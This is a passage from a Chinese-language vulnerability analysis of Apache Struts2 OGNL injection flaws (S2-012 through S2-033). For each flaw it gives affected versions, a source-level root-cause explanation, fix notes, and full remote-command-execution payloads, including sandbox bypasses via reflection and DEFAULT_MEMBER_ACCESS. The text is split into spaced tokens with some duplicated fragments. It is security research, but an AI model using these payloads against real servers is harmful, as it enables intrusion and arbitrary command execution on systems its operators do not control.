MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   &   z   [   (   password   ) (   bla   )   ] =   1   / /   \u56de\u663e POC   ?   password   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   %   23   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   %   23   writer   .   println   (   new   java   .   lang   .   String   (   %   23   res   ) ) ,   %   23   writer   .   flush   ( ) ,   %   23   writer   .   close   ( ) )   &   z   [   (   password   ) (   bla   )   ] =   1   \u4fee\u590d   \u6539\u8fdb \u4e86 \u6b63\u5219   \u589e\u52a0 \u4e86   setParameter   \u51fd\u6570 \uff0c \u9ed8\u8ba4 \u8bbe\u7f6e \u9ed8\u8ba4\u8bbe\u7f6e \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e0d\u53ef \u6267\u884c   7 .   S2 - 012   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   Showcase   App   2.0 . 0   -   Struts   Showcase   App   2.3 . 14.2   The   second   evaluation   happens   when   redirect   result   reads   it   from   the   stack   and   uses   the   previously   injected   code   as   redirect   parameter .   This   lets   malicious   users   put   arbitrary   OGNL   statements   into   any   unsanitized   String   variable   exposed   by   an   action   and   have   it   evaluated   as   an   OGNL   expression   to   enable   method   execution   and   execute   arbitrary   methods ,   bypassing   Struts   and   OGNL   library   protections .   \u770b \u63cf\u8ff0 \u53ef\u4ee5 \u77e5\u9053 \u662f struts2 \u5728 \u5904\u7406 redirect \u7684 \u65f6\u5019 \u51fa\u73b0 \u7684 \u95ee\u9898 \u3002   \u7ed3\u679c \u8fd4\u56de \u540e \u56de\u53bb \u8c03\u7528   ServletRedirectResult   \u6765 \u5904\u7406   \u6765 \u770b\u770b \u8be5 \u5bf9\u8c61 \u7684 \u5b9e\u9645 \u5904\u7406 \u51fd\u6570 \u5904\u7406\u51fd\u6570   org . apache . struts2 . dispatcher . ServletRedirectResult # execute   \u5728 \u7236\u7c7b execute \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86   conditionalParse   \u51fd\u6570   \u8fd9\u91cc \u51fa\u73b0 \u4e86 \u6211\u4eec \u6bd4\u8f83 \u719f\u6089 \u7684   TextParseUtil . translateVariables   \uff0c S2 - 001 \u5c31\u662f \u7531 \u8fd9\u4e2a \u51fd\u6570 \u6765 \u5904\u7406 String \u7c7b\u578b \u8f6c\u5316 \u7684 \u3002   \u6b64\u65f6 param \u4e3a \u6211\u4eec \u5728 struts . xml \u4e2d \u7684 \u914d\u7f6e   edit . action ? skillName = $ { currentSkill . name }   \u524d\u9762 \u5206\u6790 \u8fc7   translateVariables   \uff0c \u8fd9\u91cc \u76f4\u5207 \u4e3b\u9898   \u51fa \u95ee\u9898 \u7684 \u5730\u65b9 \u8ddf S2 - 001 \u4e00\u6837   \u89e6\u53d1 \u603b\u5171 \u5206\u4e3a \u4e24\u6b65 \uff1a   \u5c06 xml \u914d\u7f6e \u4e2d   $ { currentSkill . name }   \u89e3\u6790 \u6210 \u4f20\u5165 \u7684 \u503c \uff0c \u6b64\u65f6 stack . findValue \u4f1a \u53bb \u627e\u5230 \u524d\u9762 \u5904\u7406 \u597d\u540e \u7684 Result \u91cc\u9762 \u7684 currentSkill . name \u7684 \u503c   \u7531\u4e8e   translateVariables   \u7684 \u89e3\u6790 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6709 \u4e24\u79cd   $   \u3001   %   \uff0c \u5e76\u4e14 \u662f \u5faa\u73af \u53bb \u5904\u7406 \u7684   \u9996\u5148 \u662f \u53bb \u5904\u7406   $   \uff0c \u5c06   $ { currentSkill . name }   \u89e3\u6790 \u6210 \u5177\u4f53 \u7684 \u503c \uff0c \u5e76\u4e14 \u5c06 result \u7684 \u503c\u7f6e \u4e3a \u4ed6 \u7684 \u5185\u5bb9   \u867d\u7136 \u5df2\u7ecf \u4fee\u590d \u4e86 \u5faa\u73af \u9012\u5f52 \u6267\u884c \u7684 \u95ee\u9898 ( s2 - 001 \u4f1a \u6267\u884c \u4e24\u5c42   $ { }   ) \uff0c \u4f46\u662f \u56e0\u4e3a \u8fd8 \u5faa\u73af \u53bb \u5904\u7406   %   \uff0c \u90a3\u4e48 \u4ecd\u7136 \u53ef\u4ee5 \u8fbe\u5230 \u5faa\u73af \u9012\u5f52 \u8ba1\u7b97 \u9012\u5f52\u8ba1\u7b97 \u7684 \u6548\u679c   $ { \u53e6 \u4e00\u5c42 \u4ee5 % \u8d77\u59cb \u7684 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }   \uff0c \u6240\u4ee5 POC \u91cc\u9762 \u9700\u8981 \u7528   % { }   \u6765 \u5199\u5165 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u6240\u4ee5 \u5bf9\u4e8e S2 - 012 \u6765\u8bf4 \uff0c \u914d\u7f6e \u4e2d   $ { currentSkill . name }   \u662f \u81f3\u5173 \u91cd\u8981 \u81f3\u5173\u91cd\u8981 \u7684   \u4fee\u590d   \u7531\u4e8e \u6211 \u524d\u9762 \u5206\u6790 \u7684 \u662f   2.2 . 3   \u7248\u672c \uff0c \u540e\u7eed \u7684 \u7248\u672c \u7684   translateVariables   \u53d8\u5316 \u6709\u70b9 \u5927 \uff0c \u5176 \u4fee\u590d \u7248\u672c   \u589e\u52a0 \u4e86 pos \u6765 \u505a \u8d77\u59cb \u4f4d\u7f6e \u6765 \u67e5\u627e   $ { } % { }   \uff0c \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u5b8c\u6210 \u540e \u4f1a \u66f4\u65b0 pos \u503c \uff0c \u6765 \u9632\u6b62 \u4e8c\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c   POC   currentSkill . name = % { ( #_ memberAccess [ ' allowStaticMethodAccess ' ] = true , # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / System / Applications / Calculator . app ' ) ) }   / /   \u56de\u663e POC   % { ( #_ memberAccess [ ' allowStaticMethodAccess ' ] = true , # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , # ret = @ java . lang . Runtime @ getRuntime ( ) . exec ( ' id ' ) , # isr = new   java . io . InputStreamReader ( # ret . getInputStream ( ) ) , # br = new   java . io . BufferedReader ( # isr ) , # res = new   char [ 2000 ] , # br . read ( # res ) , # writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , # writer . println ( new   java . lang . String ( # res ) ) , # writer . flush ( ) , # writer . close ( ) ) }   8 .   S2 - 013 / S2 - 014   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 14.1   \u8fd9\u6b21 \u7684 \u539f\u7406 \u8ddf S2 - 001 \u7c7b\u4f3c \uff0c \u53ea\u662f \u95ee\u9898 \u51fa \u5728 \u89e3\u6790   < s : a >   \u3001   < s : url >   \uff0c \u5f53 \u8fd9 \u4e24\u4e2a \u6807\u7b7e \u652f\u6301   includeParams   \u5f53 \u5f53\u524d \u7684 href \u4e3a \u7a7a\u65f6 \uff0c \u4f1a \u7528 \u5f53\u524d url \u6765 \u586b\u5145 href \uff0c \u4e5f \u5c31\u662f \u5728   buildUrl   \u65f6 \u5bfc\u81f4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u8fd9\u91cc \u4e0d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u4e86 \uff0c \u770b \u4e00\u4e0b \u4ed6 \u7684 \u6267\u884c \u6808   org . apache . struts2 . views . util . DefaultUrlHelper # translateVariable   \u4e5f \u540c\u6837 \u662f \u4f7f\u7528 String \u8f6c\u6362 \u65f6 \u51fa\u73b0 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c   POC   ?   fakeParam   = %   { (   %   23 _   memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) ) }   / /   \u56de\u663e POC   ?   fakeParam   = %   { (   %   23 _   memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   %   23   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   %   23   writer   .   println   (   new   java   .   lang   .   String   (   %   23   res   ) ) ,   %   23   writer   .   flush   ( ) ,   %   23   writer   .   close   ( ) ) }   \u4fee\u590d   \u8fd9\u91cc   org . apache . struts2 . views . util . DefaultUrlHelper   \u4e0d\u518d \u4f7f\u7528 TextParseUtil \u6765 \u5904\u7406   9 .   S2 - 015   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 14.2   S2 - 015 \u4e00\u5171 \u6709 \u4e24\u79cd \uff1a   \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u6f0f\u6d1e \u539f\u7406 \u8ddf S2 - 012 \u7c7b\u4f3c \uff0c \u8fd9\u6b21 \u95ee\u9898 \u4e0d\u662f \u51fa \u5728 \u5b9a\u5411 \u91cd\u5b9a\u5411 \uff0c \u800c\u662f \u5728 \u89e3\u6790 \u5177\u4f53 \u7684 action   name \u65f6 \u51fa\u73b0 \u7684 \u95ee\u9898   \u8fd9\u91cc \u7684   { 1 }   \u4f1a \u88ab \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210   xxx . action   \u7684   xxx   \uff0c \u8fd9\u91cc \u7684   xxx   \u5982\u679c \u88ab \u6211\u4eec \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4f1a \u5728 \u540e\u7eed \u7684   TextParseUtil . translateVariables   \u5f97\u5230 \u6267\u884c \uff0c \u8fc7\u7a0b \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0 \u3002   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u662f \u7ed3\u679c \u7531 httpheader \u6765 \u5904\u7406 \u65f6 \uff0c \u4f1a \u5c06 \u6211\u4eec \u7684   $ { message }   \u5d4c\u5957 \u6267\u884c   org . apache . struts2 . dispatcher . HttpHeaderResult # execute   \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u89e3\u6790 \u6267\u884c   $ { \u53e6 \u4e00\u5c42 \u4ee5 % \u8d77\u59cb \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }   POC   / /   \u6458\u81ea https : / / www . freebuf . com / vuls / 217482 . html   % 24% 7B% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 2C% 23m% 3D% 23 _ memberAccess . getClass% 28% 29 . getDeclaredField% 28% 27allowStaticMethodAccess% 27% 29% 2C% 23m . setAccessible% 28true% 29% 2C% 23m . set% 28% 23 _ memberAccess% 2Ctrue% 29% 2C% 23q% 3D @ org . apache . commons . io . IOUtils @ toString% 28 @ java . lang . Runtime @ getRuntime% 28% 29 . exec% 28% 27ifconfig% 27% 29 . getInputStream% 28% 29% 29% 2C% 23q% 7D . action   / /   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd   \uff1f message = % { # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , # m = #_ memberAccess . getClass ( ) . getDeclaredField ( ' allowStaticMethodAccess ' ) , # m . setAccessible ( true ) , # m . set ( #_ memberAccess , true ) , # q = @ org . apache . commons . io . IOUtils @ toString ( @ java . lang . Runtime @ getRuntime ( ) . exec ( ' ifconfig ' ) . getInputStream ( ) ) , # writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , # writer . println ( # q ) , # writer . flush ( ) , # writer . close ( ) }   \u8fd9\u91cc \u6bd4\u8f83 \u7279\u6b8a \u7684 \u662f \u8fd9\u91cc \u5bf9 \u539f\u6709   #_ memberAccess [ ' allowStaticMethodAccess ' ] = true   \uff0c \u6539\u6210 \u4e86   / /   \u539f\u6765 \u7684 \u65b9\u5f0f   #   _ memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   / /   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u6765 \u8bbe\u7f6e #_ memberAccess [ ' allowStaticMethodAccess ' ]   #   m   =   #   _ memberAccess   .   getClass   ( ) .   getDeclaredField   (   '   allowStaticMethodAccess   '   ) ,   #   m   .   setAccessible   (   true   ) ,   #   m   .   set   (   #   _ memberAccess   ,   true   )   \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u8981 \u901a\u8fc7 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u5199\u5165 \u5462 \uff1f   \u5148 \u6765\u770b OGNL \u662f \u600e\u4e48 setValue \u7684   ognl . OgnlRuntime # setFieldValue   \u800c \u6b64\u65f6 \u8fd9\u91cc \u6211\u4eec \u8981 \u8bbe\u7f6e \u7684   #_ memberAccess [ ' allowStaticMethodAccess ' ]   \u662f final \u7c7b\u578b \uff0c \u6211\u4eec \u4e0d\u80fd \u4f7f\u7528 \u666e\u901a \u7684 \u65b9\u5f0f \u6539\u53d8 \u4ed6 \u7684 \u503c \uff0c \u53ea\u80fd \u901a\u8fc7 \u4e0a\u9762 \u7684 \u53cd\u5c04 \u7684 \u65b9\u5f0f \u6765 \u8fdb\u884c \u4fee\u6539 \u3002   \u8fd9\u91cc \u7684 \u6539\u53d8 \u662f\u4ece struts2   2.3 . 14.1 \u7248\u672c \u5f00\u59cb \u7684 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u9ad8\u4e8e \u8fd9\u4e2a \u7248\u672c \u7684 \u4ee5\u540e \u7684 poc \u53ea\u80fd \u901a\u8fc7 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8bbe\u7f6e   \u9664\u4e86 \u4e0a\u9762 \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u6765 \u8fdb\u884c \u7ed5\u8fc7 \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u6784\u9020 \u5668 \u7684 \u65b9\u6cd5 \u6765 \u6267\u884c \uff0c \u6bd4\u5982   new   ProccessBuilder ( ' id ' ) . start ( )   \u4fee\u590d   \u8fd9\u91cc \u7684 \u4fee\u590d \u5c31\u662f S2 - 012 \u7684 \u4fee\u590d \uff0c \u4e3b\u8981 \u4fee\u590d \u4e86 \u6267\u884c \u8fd9\u79cd OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   $ { \u53e6 \u4e00\u5c42 % \u8d77\u59cb \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }   10 .   S2 - 016   \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 15   S2 - 016 \u95ee\u9898 \u51fa \u5728 \u5904\u7406 \u9ed8\u8ba4 \u7684   action : xxx   \u6216   redirect : xxx   \uff0c \u540e\u9762 \u8ddf \u7684   xxx   \u4e3a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c Struts2 \u9ed8\u8ba4 \u5c06 \u7528   ServletRedirectResult   \u6765 \u5904\u7406 \u8df3\u8f6c \u95ee\u9898 \uff0c \u8fd9\u91cc \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u53ea\u662f \u8fd9\u91cc \u7684 \u8df3\u8f6c \u8bbe\u7f6e \u5728 url \u91cc\u9762   \u6267\u884c \u94fe\u8def \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u4e0d \u4f5c \u5206\u6790 \u4e86   POC   redirect   :   %   {   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   #   m   =   #   _ memberAccess   .   getClass   ( ) .   getDeclaredField   (   '   allowStaticMethodAccess   '   ) ,   #   m   .   setAccessible   (   true   ) ,   #   m   .   set   (   #   _ memberAccess   ,   true   ) ,   #   q   =   @ org . apache . commons . io . IOUtils @ toString   (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) .   getInputStream   ( ) ) ,   #   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   #   writer   .   println   (   #   q   ) ,   #   writer   .   flush   ( ) ,   #   writer   .   close   ( ) }   \u4fee\u590d   org . apache . struts2 . dispatcher . mapper . DefaultActionMapper   \u9ed8\u8ba4 \u7684   redirect / redirectaction   \u76f4\u63a5 \u88ab \u5220\u9664 \u4e86   action :   \u90e8\u5206 \u56e0\u4e3a S2 - 015 \u7684 \u5173\u7cfb \uff0c \u9650\u5236 \u4e86 action \u540d   \u5df2\u7ecf \u4e0d \u6784\u6210 \u5a01\u80c1 \u6784\u6210\u5a01\u80c1 \u4e86   11 .   S2 - 019   \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 15.1   S2 - 019 \u8ddf S2 - 008 \u7684 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u6f0f\u6d1e \u4e00\u6837 \uff0c \u5f53 \u5f00\u542f \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u65f6 \uff0c \u5141\u8bb8 \u4f7f\u7528 command \u7684 \u6a21\u5f0f \u6765 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u5177\u4f53 \u770b S2 - 008   POC   ? debug = command & expression = ( % 23context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , % 23m = % 23 _ memberAccess . getClass ( ) . getDeclaredField ( ' allowStaticMethodAccess ' ) , % 23m . setAccessible ( true ) , % 23m . set ( % 23 _ memberAccess , true ) , % 23q = @ org . apache . commons . io . IOUtils @ toString ( @ java . lang . Runtime @ getRuntime ( ) . exec ( ' id ' ) . getInputStream ( ) ) , % 23writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23writer . println ( % 23q ) , % 23writer . flush ( ) , % 23writer . close ( ) )   \u4fee\u590d   \u8fd9\u91cc \u540e\u9762 \u7684 \u51e0\u4e2a \u7248\u672c \u90fd \u662f \u5141\u8bb8 \u6267\u884c \u7684 \uff0c \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u4e0b \u7684 command \u5e76 \u6ca1\u6709 \u88ab \u53d6\u6d88 \u6389 \uff0c \u6240\u4ee5 \u5982\u679c \u5728\u7ebf \u4e0a \u73af\u5883 \u78b0\u5230 debug \u6a21\u5f0f \uff0c \u90a3 \u5c31 \u53ef\u4ee5 \u5c1d\u8bd5 \u4e00\u4e0b OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u4f46\u662f \u7531\u4e8e \u4ece struts2   2.3 . 20 \u4e4b\u540e \u5f15\u5165 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6a21\u5f0f \uff08 excludedClasses ,   excludedPackageNames   \u548c   excludedPackageNamePatterns \uff09 \uff0c \u5e76\u4e14 \u4f7f\u7528 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u65b9\u5f0f \u4e5f \u5931\u6548 \u4e86   \u8fd9\u91cc \u524d\u8f88 \u4eec \u7528\u5230 \u4e86 \u5c06 SecurityMemberAccess \u521d\u59cb \u521d\u59cb\u5316 \u7684 \u65b9\u5f0f \u6765 \u7ed5\u8fc7 \u8fd9\u4e2a \u9650\u5236 \uff0c \u539f\u7406 \u53ef\u4ee5 \u597d\u597d \u770b\u770b \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 https : / / paper . seebug . org / 794 / # 33 - struts - 2329 \u3002   debug   =   command   &   expression   =   ( (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   + /   System   /   Applications   /   Calculator   .   app   '   ) ) )   \u540e\u7eed \u8fd8\u6709 \u4e00\u4e9b \u7ed5\u8fc7 \uff0c \u540e\u9762 \u518d \u8bb2   12 .   S2 - 029 / S2 - 036   S2 - 029 \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 24.1   ( except   2.3 . 20.3 )   S2 - 036 \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 28.1   \uff08 \u8ddf S2 - 029 \u4e00\u6837 \uff0c \u4e3b\u8981 \u5728 \u4fee\u590d \u7684 \u5730\u65b9 \u8bb2 \uff09   \u539f\u7406 \u8ddf S2 - 001 \u4e0d\u591a \u5dee\u4e0d\u591a \uff0c S2 - 029 \u7684 \u89e6\u53d1 \u9700\u8981 jsp \u7528\u5230 \u6807\u7b7e   < s : textfield   name = \" % { xxxx } \" > < / s : textfield >   \uff0c name \u5c5e\u6027 \u4e2d \u7531 \u4e00 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u89e3\u6790 \u800c \u5f97 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u751f\u6210 \u7684 input \u6807\u7b7e \u7684 name \u5c5e\u6027 \u662f \u52a8\u6001 \u8ba1\u7b97 \u800c \u5f97 \u7684 \uff0c \u6bd4\u5982 ? xxxx = username \uff0c \u6b64\u65f6 \u89e3\u6790 \u5f97\u5230 \u7684 input . name \u4e3a username \u3002 \u8fd9 \u5176\u4e2d \u6267\u884c \u4e86   % { xxxx }   \uff0c \u83b7\u5f97 xxxx \u7684 \u5185\u5bb9 \u3002 \u800c S2 - 001 \u7684 \u4fee\u590d \u4e3b\u8981 \u89e3\u51b3 \u7684 \u662f \u9012\u5f52 \u8ba1\u7b97 \u9012\u5f52\u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u95ee\u9898 \uff0c S2 - 029 \u5c31\u662f \u5728 \u8fdb\u5165 translateVariables \u4e4b\u524d \u5c31 \u5c06 \u7b2c\u4e00 \u4e00\u5c42 \u7b2c\u4e00\u5c42 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u5b8c\u6bd5   \u76f4\u63a5 \u770b   UIBean . evaluateParams   \u9996\u5148 \u8ba1\u7b97   % { message }   \u5230 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u540e\u7eed \u4f1a \u5728 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u62ec \u4e0a   % { xxx }   \u6b64\u65f6 \u518d \u4f20\u5165 \u5230   findValue   \u5c31\u662f \u7b2c\u4e8c \u4e8c\u5c42 \u7b2c\u4e8c\u5c42 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u540e\u7eed \u8ddf S2 - 001 \u4e00\u6837 \uff0c \u53ea \u9700\u8981 \u6267\u884c \u4e00\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8ba1\u7b97 \u5373\u53ef   POC   / /   \u9700\u8981 \u5148 \u521d\u59cb \u521d\u59cb\u5316 SecurityMemberAccess \uff0c \u4e0d\u7136 \u65e0\u6cd5 \u6267\u884c   ?   message   =   ( (   %   23 _   memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   + /   System   /   Applications   /   Calculator   .   app   '   ) ) )   / /   \u56de\u663e POC   ?   message   =   (   %   23 _   memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ) ,   %   23   q   =   @ org . apache . commons . io . IOUtils @ toString   (   %   23   ret   .   getInputStream   ( ) )   / /   S2 - 036   ( (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   #   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ) ) . (   #   q   =   @ org . apache . commons . io . IOUtils @ toString   (   #   ret   .   getInputStream   ( ) ) )   \u4fee\u590d S2 - 029   com . opensymphony . xwork2 . ognl . OgnlUtil # compileAndExecute   \u5728 \u8ba1\u7b97 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e4b\u524d \uff0c \u9a8c\u8bc1 \u662f\u5426 \u53ef\u4ee5 \u6267\u884c   \u8fd9\u91cc \u5148\u770b   node . isEvalChain   \uff0c \u8fd9\u91cc \u662f \u5bf9 S2 - 009 \u505a \u7684 \u9650\u5236 \uff0c \u4e5f \u5c31\u662f \u5f53 \u51fa\u73b0   ( ( 1 ) ( 2 ) )   \u65f6 \uff0c \u4f1a \u89e3\u6790 \u51fa   ASTEval   \u8282\u70b9 \uff0c \u800c   ASTEval   \u5bf9\u8c61 \u7684   isEvalChain   \u51fd\u6570 \u76f4\u63a5 \u8fd4\u56de true \uff0c \u4e5f \u5c31 \u4f7f\u5f97   ( 1 ) ( 2 )   \u65e0\u6cd5 \u6267\u884c   \u5176\u6b21 \u518d \u6765\u770b   node . isSequence   \uff0c \u8fd9\u91cc \u662f \u5bf9 \u5f62\u5982   ( xxx1 , xxx2 , xxx3 )   \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u9650\u5236 \uff0c \u4ed6 \u5c06 \u89e3\u6790 \u51fa   ASTSequence   \u8282\u70b9 \uff0c   ASTSequence   \u5bf9\u8c61 \u7684   isSequence   \u76f4\u63a5 \u8fd4\u56de true \uff0c \u4e5f \u5c31 \u9650\u5236 \u4e86 \u8fd9\u79cd \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u7136\u540e \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f \uff0c \u5bf9\u4e8e \u5f62 \u5982   ( ( xxx1 ) . ( xxx2 ) . ( xxx3 ) )   \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u8fd9\u662f \u4e00\u79cd   ASTChain   \uff0c \u4f46 \u5176\u4e2d \u5e76 \u4e0d\u4f1a \u89e3\u6790 \u51fa   ASTEval   \u770b \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u77e5\u9053 \u53ef\u4ee5 \u5c06 S2 - 029 \u7684 \u4fee\u590d bypass \u6389 \uff0c \u4e5f \u5c31\u662f S2 - 036 \u7684 \u95ee\u9898   13 .   S2 - 032 / S2 - 033 / S2 - 037   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.3 . 20   -   Struts   Struts   2.3 . 28   ( except   2.3 . 20.3   and   2.3 . 24.3 )   \u8fd9\u91cc \u6211 \u7684 \u73af\u5883 \u642d \u7684 \u662f rest - showcase \u7684 \uff0c \u6240\u4ee5 \u4e3b\u8981 \u8bb2 S2 - 033 \uff08 S2 - 032 \u7684 \u539f\u7406 \u8ddf \u4ed6 \u4e0d\u591a \u5dee\u4e0d\u591a \uff0c \u53ea\u662f \u89e6\u53d1 \u53d8\u6210 \u4e86   method : #_ xxxx   )   rest - plugin \u652f\u6301 \u89e3\u6790   xxx ! method   \u7684 \u8c03\u7528   org . apache . struts2 . rest . RestActionMapper # handleDynamicMethodInvocation   \u89e3\u6790   name ! method   \uff0c \u5e76 \u5bf9 \u5f53\u524d \u7684   restactionmapper   \u8bbe\u7f6e \u597d \u540e\u7eed \u8981 \u8c03\u7528 method   \u5728 struts2 \u7684 \u6240\u6709 intercepter \u8c03\u7528 \u5b8c\u6bd5 \u540e \uff0c \u4f1a \u53bb \u8c03\u7528 DefaultActionInvocation \u7684 invokeActionOnly \u51fd\u6570   \u800c invokeActionOnly \u4f1a \u53bb \u8c03\u7528   com . opensymphony . xwork2 . DefaultActionInvocation # invokeAction   \u5728 